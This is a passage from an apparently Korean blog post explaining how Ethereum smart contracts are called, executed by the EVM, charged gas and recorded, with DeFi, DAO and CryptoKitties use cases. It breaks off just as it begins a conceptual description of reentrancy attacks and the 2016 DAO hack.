&#xC804;&#xD30C;&#xB418;&#xBA70;, &#xC774; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xBE14;&#xB85D;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xBA74; &#xD574;&#xB2F9; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xACE0;&#xC720;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xBD80;&#xC5EC;&#xBC1B;&#xC544; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xB4F1;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/13/bekim/smartcontract/ko/image1.png" alt></p><p>3) <strong>&#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xD638;&#xCD9C;</strong></p><pre><code class="hljs solidity">function send(address receiver, uint amount) public {        require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));        balances[msg.sender] -= amount;        balances[receiver] += amount;        emit Sent(msg.sender, receiver, amount);    }</code></pre><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD2B9;&#xC815; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC815;&#xBCF4;(&#xB300;&#xC0C1; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xC8FC;&#xC18C;, ABI &#xAE30;&#xBC18; &#xD568;&#xC218; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;, &#xAC00;&#xC2A4; &#xC815;&#xBCF4; &#xB4F1;)&#xB97C; &#xB2F4;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC; &#xCF54;&#xB4DC;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; Coin.sol&#xC758; send() &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;&#xACE0; &#xD560; &#xB54C;, &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC740; &#xB178;&#xB4DC;&#xC758; mempool&#xC5D0; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xACE0;, &#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xC790;(miner &#xB610;&#xB294; validator)&#xAC00; &#xC120;&#xD0DD;&#xD574; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; mempool&#xC5D0; &#xB4E4;&#xC5B4;&#xAC04; &#xD6C4;, &#xC218;&#xC218;&#xB8CC;(gas price)&#xAC00; &#xB192;&#xC740; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xCC98;&#xB9AC;&#xB3FC;&#xC694;!</p><p>&#x2192; mempool(Memory Pool): &#xC544;&#xC9C1; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB4E4;&#xC774; &#xC784;&#xC2DC;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACF5;&#xAC04;</p><p><img src="/2025/07/13/bekim/smartcontract/ko/image2.png" alt></p><p> &#xC774; &#xD2B8;&#xB79C;&#xC81D;&#xC158;&#xC744; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD305;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/07/13/bekim/smartcontract/ko/image3.png" alt></p><p>4) <strong>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xC2E4;&#xD589; (EVM)</strong></p><p>&#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xC790;&#xAC00; &#xBA3C;&#xC800; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0;, &#xB2E4;&#xB978; &#xAC80;&#xC99D; &#xB178;&#xB4DC;&#xB4E4;&#xC740; &#xC774;&#xB97C; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC7AC;&#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xBE14;&#xB85D;&#xC758; &#xC815;&#xB2F9;&#xC131;&#xC744; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. &#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xC790;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C;, EVM&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xD568;&#xC218;(send() &#xB4F1;)&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. EVM&#xC740; &#xC785;&#xB825;&#xAC12;&#xC744; &#xB514;&#xCF54;&#xB529;&#xD558;&#xC5EC; &#xD638;&#xCD9C;&#xD560; &#xD568;&#xC218;&#xB97C; &#xB9E4;&#xD551;&#xD558;&#xACE0;, require &#xC870;&#xAC74;&#xBB38;, &#xC0C1;&#xD0DC; &#xBCC0;&#xACBD;, &#xC774;&#xBCA4;&#xD2B8; &#xAE30;&#xB85D; &#xB4F1; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xB85C;&#xC9C1;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));</code></pre><p>&#xC774; &#xC870;&#xAC74;&#xC774; &#xCDA9;&#xC871;&#xB418;&#xBA74; &#xACC4;&#xC57D;&#xC774; &#xC774;&#xD589;&#xB418;&#xACE0;, &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; InsufficientBalance &#xC624;&#xB958;&#xAC00; &#xB098; revert&#xB418;&#xACE0; &#xBAA8;&#xB4E0; &#xBCC0;&#xACBD;&#xC774; &#xB864;&#xBC31;&#xB3FC;&#xC694;.</p><p>5) <strong>&#xAC00;&#xC2A4; &#xCC98;&#xB9AC;</strong></p><p>&#xB610;&#xD55C; EVM&#xC758; &#xC2E4;&#xD589;&#xC5D0;&#xB294; &#xAC00;&#xC2A4;(Gas)&#xAC00; &#xC18C;&#xBAA8;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xB178;&#xB4DC;(&#xAC80;&#xC99D;&#xC790;)&#xB4E4;&#xC5D0;&#xAC8C; &#xC778;&#xC13C;&#xD2F0;&#xBE0C;&#xB85C; &#xC8FC;&#xC5B4;&#xC9C0;&#xACE0;, &#xACFC;&#xB3C4;&#xD55C; &#xC5F0;&#xC0B0;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC5B4;&#xC694;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC124;&#xC815;&#xD55C; gasLimit&#xACFC; &#xC2E4;&#xC81C; &#xC18C;&#xBAA8;&#xB7C9;&#xC5D0; &#xB530;&#xB77C; &#xB0A8;&#xC740; &#xAC00;&#xC2A4;&#xB294; &#xD658;&#xBD88;&#xB418;&#xBA70;, &#xC2E4;&#xD328;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xB3C4; &#xAC00;&#xC2A4;&#xB294; &#xC18C;&#xBAA8;&#xB429;&#xB2C8;&#xB2E4;.</p><p>6) <strong>&#xACB0;&#xACFC; &#xC800;&#xC7A5;</strong></p><p>&#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC2E4;&#xD589;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xAC00; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xBC18;&#xC601;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC0C1;&#xD0DC; &#xBCC0;&#xD654;: &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>balances[msg.sender] -= amount</code> &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xC800;&#xC7A5;&#xC18C; &#xBCC0;&#xD654;&#xB294; &#xC0C1;&#xD0DC; &#xD2B8;&#xB77C;&#xC774;(<strong>state trie)</strong>&#xC5D0; &#xBC18;&#xC601;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xBCA4;&#xD2B8; &#xB85C;&#xADF8;: <code>emit Sent(&#x2026;)</code> &#xC640; &#xAC19;&#xC740; &#xC774;&#xBCA4;&#xD2B8;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xB85C;&#xADF8; &#xC800;&#xC7A5;&#xC18C;(receipts)&#xC5D0; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xB7F0; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC740; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xBAA8;&#xB4E0; &#xB178;&#xB4DC;&#xAC00; &#xACF5;&#xC720;&#xD558;&#xB294; &#xC601;&#xAD6C;&#xC801;&#xC778; &#xAE30;&#xB85D;&#xC774; &#xB418;&#xACE0;, &#xB204;&#xAD6C;&#xB4E0;&#xC9C0; &#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xAC70;&#xB098; &#xC870;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC131;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C;, &#xC870;&#xAC74;&#xC774; &#xCDA9;&#xC871;&#xB418;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xC804;&#xD1B5;&#xC801;&#xC778; &#xACC4;&#xC57D; &#xBC29;&#xC2DD;&#xBCF4;&#xB2E4; &#xC544;&#xC8FC; &#xD6A8;&#xC728;&#xC801;&#xC774;&#xC5D0;&#xC694;. &#xD2B9;&#xD788; &#xC911;&#xAC1C;&#xC790; &#xC5C6;&#xC774;&#xB3C4; &#xACC4;&#xC57D;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD560; &#xACBD;&#xC6B0; &#xD22C;&#xBA85;&#xC131; &#xACFC; &#xBCC0;&#xACBD; &#xBD88;&#xAC00;&#xB2A5;&#xC131;&#xC774; &#xBCF4;&#xC7A5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E0;&#xB8B0;&#xC131;&#xB3C4; &#xB192;&#xC740; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC7A5;&#xC810; &#xB355;&#xBD84;&#xC5D0;, &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC810;&#xC810; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xB85C; &#xD65C;&#xC6A9; &#xBC94;&#xC704;&#xB97C; &#xB113;&#xD600;&#xAC00;&#xACE0; &#xC788;&#xC5B4;&#xC694;</p><h2 id="&#xC2A4;&#xB9C8;&#xD2B8;-&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758;-&#xD65C;&#xC6A9;-&#xC0AC;&#xB840;"><a href="#&#xC2A4;&#xB9C8;&#xD2B8;-&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758;-&#xD65C;&#xC6A9;-&#xC0AC;&#xB840;" class="headerlink" title="&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD65C;&#xC6A9; &#xC0AC;&#xB840;"></a>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD65C;&#xC6A9; &#xC0AC;&#xB840;</h2><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC774;&#xB77C;&#xB294; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xD1B5;&#xD574; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xD65C;&#xC6A9; &#xAE30;&#xBC18;&#xC744; &#xAC16;&#xCD98; &#xC774;&#xD6C4;&#xB85C;, &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xB85C; &#xD655;&#xC7A5;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>1) <strong>DeFi (&#xD0C8;&#xC911;&#xC559;&#xD654; &#xAE08;&#xC735;)</strong></p><p>DeFi&#xB294; &#xAE30;&#xC874;&#xC758; &#xC740;&#xD589;, &#xC99D;&#xAD8C;&#xC0AC; &#xAC19;&#xC740; &#xC911;&#xC559;&#xD654;&#xB41C; &#xAE08;&#xC735;&#xAE30;&#xAD00; &#xC5C6;&#xC774;&#xB3C4;, &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC608;&#xAE08;, &#xB300;&#xCD9C;, &#xC790;&#xC0B0;&#xAC70;&#xB798;, &#xD30C;&#xC0DD; &#xC0C1;&#xD488; &#xB4F1;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xD0C8; &#xC911;&#xC559;&#xD654;&#xB41C; &#xAE08;&#xC735; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. DeFi &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xBAA8;&#xB4E0; &#xAE08;&#xC735; &#xAC70;&#xB798; &#xB85C;&#xC9C1;&#xC744; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB85C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Aave&#xB098; Compound&#xAC19;&#xC740; DeFi &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC554;&#xD638;&#xD654;&#xD3D0;&#xB97C; &#xC608;&#xCE58;&#xD558;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC774;&#xC790;&#xB97C; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xACE0;, &#xB2E4;&#xB978; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB2F4;&#xBCF4;&#xB97C; &#xAC78;&#xACE0; &#xB300;&#xCD9C;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC5B4;&#xC694;</p><p>&#xB610; &#xB2E4;&#xB978; &#xC608;&#xB85C;&#xB294; Uniswap&#xC774; &#xC788;&#xC5B4;&#xC694;. &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC911;&#xC559; &#xAC70;&#xB798;&#xC18C; &#xC5C6;&#xC774;&#xB3C4; &#xC554;&#xD638;&#xD654;&#xD3D0;&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xAD50;&#xD658;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC778;&#xB370;, &#xAC70;&#xB798;&#xB294; &#xBBF8;&#xB9AC; &#xC608;&#xCE58;&#xB41C; &#xC720;&#xB3D9;&#xC131; &#xD480;&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC9C4;&#xD589;&#xB418;&#xACE0;, &#xAD50;&#xD658; &#xB85C;&#xC9C1; &#xC5ED;&#xC2DC; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB85C; &#xCC98;&#xB9AC;&#xB3FC;&#xC694;. &#xC774;&#xC640; &#xC720;&#xC0AC;&#xD558;&#xAC8C; Curve&#xB294; &#xC2A4;&#xD14C;&#xC774;&#xBE14; &#xCF54;&#xC778; &#xAC04;&#xC758; &#xAD50;&#xD658;&#xC5D0; &#xD2B9;&#xD654;&#xB41C; &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C;, &#xAC70;&#xB798; &#xACFC;&#xC815; &#xB610;&#xD55C; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0; &#xC758;&#xD574; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>2) <strong>DAO (&#xD0C8;&#xC911;&#xC559;&#xD654;&#xB41C; &#xC790;&#xC728;&#xC870;&#xC9C1;)</strong></p><p>DAO (Decentralized Autonomous Organization)&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC778; &#xC870;&#xC9C1;&#xCC98;&#xB7FC; &#xD2B9;&#xC815; &#xAD00;&#xB9AC;&#xC790;&#xB098; &#xC6B4;&#xC601;&#xC790;&#xAC00; &#xC544;&#xB2C8;&#xB77C;, &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0; &#xC758;&#xD574; &#xADDC;&#xCE59;&#xACFC; &#xC758;&#xC0AC; &#xACB0;&#xC815;&#xC774; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC9D1;&#xD589;&#xB418;&#xB294; &#xC870;&#xC9C1; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xAD6C;&#xC131;&#xC6D0;&#xB4E4;&#xC740; DAO &#xD1A0;&#xD070;&#xC744; &#xBCF4;&#xC720;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD22C;&#xD45C;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xACE0;, &#xC81C;&#xC548;&#xB41C; &#xC548;&#xAC74;&#xC774; &#xC77C;&#xC815; &#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xBA74; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; &#xADF8; &#xB0B4;&#xC6A9;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xB85C;&#xB294; MarkerDAO&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. MarkerDAO&#xB294; &#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xAE30;&#xBC18;&#xC758; DAO&#xB85C;, &#xD0C8;&#xC911;&#xC559;&#xD654;&#xB41C; &#xC2A4;&#xD14C;&#xC774;&#xBE14; &#xCF54;&#xC778;&#xC778; DAI&#xB97C; &#xBC1C;&#xD589;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. MarkerDAO&#xB294; DAI&#xC758; &#xAC00;&#xCE58;&#xB97C; &#xC548;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xBA74;&#xC11C; &#xAD6C;&#xC131;&#xC6D0;&#xB4E4;&#xC774; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xC790;&#xC728; &#xC870;&#xC815;&#xC774;&#xB098; &#xC2DC;&#xC2A4;&#xD15C; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC; &#xB4F1;&#xC5D0; &#xB300;&#xD574; &#xD22C;&#xD45C;&#xD574;&#xC694;.</p><p>&#xC774;&#xCC98;&#xB7FC; DAO&#xB294; &#xC0AC;&#xB78C;&#xC758; &#xAC1C;&#xC785; &#xC5C6;&#xC774;&#xB3C4; &#xCF54;&#xB4DC;&#xC5D0; &#xC758;&#xD574; &#xC6B4;&#xC601;&#xC774; &#xC870;&#xC9C1;&#xB420; &#xC218; &#xC788;&#xB294; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. </p><p>3) <strong>CryptoKitties</strong></p><p>CryptoKitties&#xB294; 2017&#xB144; &#xB4F1;&#xC7A5;&#xD55C; &#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xAE30;&#xBC18;&#xC758; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xAC8C;&#xC784;&#xC774;&#xC5D0;&#xC694;. &#xC774; &#xAC8C;&#xC784;&#xC740; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xD65C;&#xC6A9;&#xD574; &#xB514;&#xC9C0;&#xD138; &#xACE0;&#xC591;&#xC774;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xAD50;&#xBC30;&#xD558;&#xBA70; &#xAC70;&#xB798;&#xD560; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.</p><p>&#xC774; &#xAC8C;&#xC784;&#xC5D0;&#xC11C; &#xACE0;&#xC591;&#xC774;&#xB294; &#xAC01;&#xAC01; &#xACE0;&#xC720;&#xD55C; &#xD2B9;&#xC131;&#xACFC; &#xC678;&#xD615;&#xC744; &#xC9C0;&#xB2CC; NFT&#xB85C; &#xD45C;&#xD604;&#xB3FC;&#xC694;. &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB450; &#xB9C8;&#xB9AC;&#xC758; &#xACE0;&#xC591;&#xC774;&#xB97C; &#xAD50;&#xBC30;&#xC2DC;&#xCF1C; &#xC0C8;&#xB85C;&#xC6B4; &#xACE0;&#xC591;&#xC774;&#xB97C; &#xD0C4;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACE0;, &#xC774; &#xB54C; &#xC720;&#xC804; &#xC815;&#xBCF4;&#xC758; &#xC870;&#xD569;&#xACFC; &#xAD50;&#xBC30; &#xACB0;&#xACFC;&#xB294; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0; &#xC758;&#xD574; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xACB0;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; &#xACE0;&#xC591;&#xC774;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; NFT&#xB85C; &#xB4F1;&#xB85D;&#xB418;&#xACE0;, &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC774; &#xACE0;&#xC591;&#xC774;&#xB97C; &#xB2E4;&#xB978; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xD310;&#xB9E4;&#xD558;&#xAC70;&#xB098; &#xBCF4;&#xC720;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774; &#xAC8C;&#xC784;&#xC740; &#xCD9C;&#xC2DC; &#xC9C1;&#xD6C4; &#xD070; &#xC778;&#xAE30;&#xB97C; &#xB04C;&#xBA70; &#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xACFC;&#xBD80;&#xD558;&#xB97C; &#xC77C;&#xC73C;&#xD0AC; &#xC815;&#xB3C4;&#xC600;&#xC5B4;&#xC694;.</p><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xAE08;&#xC735;, &#xC870;&#xC9C1; &#xC6B4;&#xC601;, &#xAC8C;&#xC784; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xD65C;&#xBC1C;&#xD558;&#xAC8C; &#xD65C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC740; &#xBCF4;&#xC548;&#xC131;&#xC774; &#xB6F0;&#xC5B4;&#xB09C; &#xAE30;&#xC220;&#xB85C; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC9C0;&#xB9CC;, &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xBA87; &#xCC28;&#xB840; &#xD574;&#xD0B9; &#xC0AC;&#xB840;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xBC14; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; &#xC2E4;&#xC81C; &#xC0AC;&#xB840;&#xC640; &#xD568;&#xAED8; smart contract&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Smart-Contract&#xC758;-&#xCDE8;&#xC57D;&#xC810;"><a href="#Smart-Contract&#xC758;-&#xCDE8;&#xC57D;&#xC810;" class="headerlink" title="Smart Contract&#xC758; &#xCDE8;&#xC57D;&#xC810;"></a>Smart Contract&#xC758; &#xCDE8;&#xC57D;&#xC810;</h2><h3 id="1-Reentrancy-Attack"><a href="#1-Reentrancy-Attack" class="headerlink" title="1. Reentrancy Attack"></a>1. Reentrancy Attack</h3><p>Reentrancy Attack(&#xC7AC;&#xC9C4;&#xC785; &#xACF5;&#xACA9;)&#xC740; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xC0C1;&#xD0DC;(state)&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD558;&#xAE30;&#xC804;&#xC5D0; &#xC678;&#xBD80; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB85C; &#xD638;&#xCD9C;&#xC744; &#xC218;&#xD589;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;, &#xC678;&#xBD80; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;(&#xC545;&#xC758;&#xC801;&#xC778; &#xACBD;&#xC6B0;)&#xAC00; &#xC6D0;&#xB798; &#xD568;&#xC218;&#xB85C; &#xB2E4;&#xC2DC; &#xC7AC;&#xC9C4;&#xC785;&#xD558;&#xC5EC;, &#xAC19;&#xC740; &#xC0C1;&#xD0DC;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCD9C;&#xAE08; &#xB4F1;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. </p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2016&#xB144; DAO &#xD574;&#xD0B9; &#xC0AC;&#xAC74;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC57D; 6000&#xB9CC; &#xB2EC;&#xB7EC;&#xAC00; &#xD0C8;&#xCDE8;&#xB2F9;&#xD558;&#xBA74;&#xC11C;, &#xAC00;&#xC7A5; &#xBA3C;&#xC800; 